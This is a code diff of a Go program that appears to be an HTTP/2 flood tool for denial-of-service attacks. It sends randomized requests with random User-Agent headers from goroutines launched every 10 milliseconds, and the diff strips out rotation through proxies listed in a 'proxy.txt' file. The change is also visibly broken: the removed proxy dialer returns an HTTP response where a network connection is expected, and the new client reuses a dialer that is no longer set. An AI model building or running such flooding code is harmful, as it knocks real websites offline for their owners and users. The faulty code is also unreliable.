@@ -2,8 +2,6 @@ package main
 
 import (
 	"flag"
-	"bufio"
-	"net/url"
 	"fmt"
 	"math/rand"
 	"net/http"
@@ -46,7 +44,7 @@ func buildblock(size int) (s string) {
 	return string(a)
 }
 
-func get(proxyURLs []*url.URL) {
+func get() {
 	if strings.ContainsRune(host, '?') {
 		param_joiner = "&"
 	} else {
@@ -60,37 +58,14 @@ func get(proxyURLs []*url.URL) {
 	
 	req.Proto = "HTTP/2.0"
 
-	// Baca file proxy list
-	proxyFile, err := os.Open("proxy.txt")
-	if err != nil {
-		fmt.Println("Error opening proxy list file:", err)
-		return
-	}
-	defer proxyFile.Close()
-
-	var proxyURLs []*url.URL
-	scanner := bufio.NewScanner(proxyFile)
-	for scanner.Scan() {
-		proxyStr := "http://" + scanner.Text() // Format proxy string
-		proxyURL, err := url.Parse(proxyStr)
-		if err != nil {
-			fmt.Println("Error parsing proxy URL:", err)
-			continue
-		}
-		proxyURLs = append(proxyURLs, proxyURL)
-	}
 
 	transport := &http2.Transport{
 		AllowHTTP: true,
-		ProxyConnectHeader: http.Header{},
 	}
 
-	transport.DialTLS = func(network, addr string, cfg *tls.Config) (net.Conn, error) {
-		proxyURL := proxyURLs[rand.Intn(len(proxyURLs))]
-		proxyStr := proxyURL.String()
-		proxy := &http.Transport{Proxy: http.ProxyURL(proxyURL)}
-		client := &http.Client{Transport: proxy}
-		return client.Get("https://" + addr)
+	c := http.Client{
+		Timeout:   3500 * time.Millisecond,
+		Transport: &http2.Transport{DialTLS: transport.DialTLS},
 	}
 
 	req.Header.Set("User-Agent", uarand.GetRandom())
@@ -126,7 +101,7 @@ func loop() {
 		if atomic.LoadInt32(&stopFlag) == 1 {
 			return
 		}
-		go get(proxyURLs)
+		go get()
 		time.Sleep(10000 * time.Microsecond)
 	}
 }
